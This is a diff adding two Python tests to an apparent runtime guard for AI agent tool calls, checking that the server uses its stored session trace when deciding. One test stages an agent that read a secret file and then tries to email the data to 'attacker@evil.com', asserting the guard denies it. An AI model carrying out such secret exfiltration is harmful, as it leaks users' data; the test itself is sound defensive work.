@@ -1074,6 +1074,91 @@ def test_server_merges_client_cached_entries_into_trajectory_window():
     assert m.trace_store.get("s6")
 
 
+def test_server_uses_trace_store_window_when_request_window_is_empty():
+    m = RuntimeManager(
+        plugin_config={
+            "phases": {
+                "tool_before": {"client": [], "server": ["tool_invoke", "rule_based_plugin"]}
+            }
+        }
+    )
+    m.policy.store.set_rules(_runtime_rules())
+    m.record_uploaded_trace(
+        {
+            "session_id": "stored-session",
+            "reason": "round_complete",
+            "entries": [
+                {
+                    "event": {
+                        "event_id": "stored_evt",
+                        "event_type": "tool_result",
+                        "payload": {"tool_name": "read_file", "result": "secret"},
+                        "risk_signals": ["secret_detected"],
+                    },
+                    "decision": {"decision_type": "allow", "reason": "local"},
+                }
+            ],
+        }
+    )
+
+    req = {
+        "request_id": "r_store_backed",
+        "context": {"session_id": "stored-session"},
+        "current_event": {
+            "event_type": "tool_invoke",
+            "payload": {
+                "tool_name": "send_email",
+                "arguments": {"to": "attacker@evil.com", "body": "data"},
+                "capabilities": ["external_send"],
+            },
+            "risk_signals": [],
+        },
+        "trajectory_window": [],
+        "local_signals": [],
+    }
+
+    res = m.decide(req)
+
+    assert res["decision"]["decision_type"] == "deny"
+
+
+def test_server_plugins_use_trace_store_not_raw_request_window():
+    m = RuntimeManager(
+        plugin_config={
+            "phases": {
+                "tool_before": {"client": [], "server": [TraceAwarePlugin]}
+            }
+        },
+    )
+    req = {
+        "request_id": "r_store_source",
+        "context": {"session_id": "s_store_source"},
+        "current_event": {
+            "event_type": "tool_invoke",
+            "payload": {"tool_name": "send_email", "arguments": {}, "capabilities": []},
+            "risk_signals": [],
+        },
+        "trajectory_window": [
+            {
+                "event_id": "foreign_evt",
+                "event_type": "tool_result",
+                "context": {"session_id": "other-session"},
+                "payload": {"tool_name": "read_file", "result": "secret"},
+                "risk_signals": ["secret_detected"],
+            }
+        ],
+        "local_signals": [],
+    }
+
+    res = m.decide(req)
+
+    assert "trace_window_seen" not in res["plugin_result"]["risk_signals"]
+    assert m.trace_store.get("other-session")
+    current_records = m.trace_store.get("s_store_source")
+    assert len(current_records) == 1
+    assert current_records[0].reason == "guard_decide"
+
+
 def test_server_records_uploaded_trace():
     m = RuntimeManager()
     count = m.record_uploaded_trace(
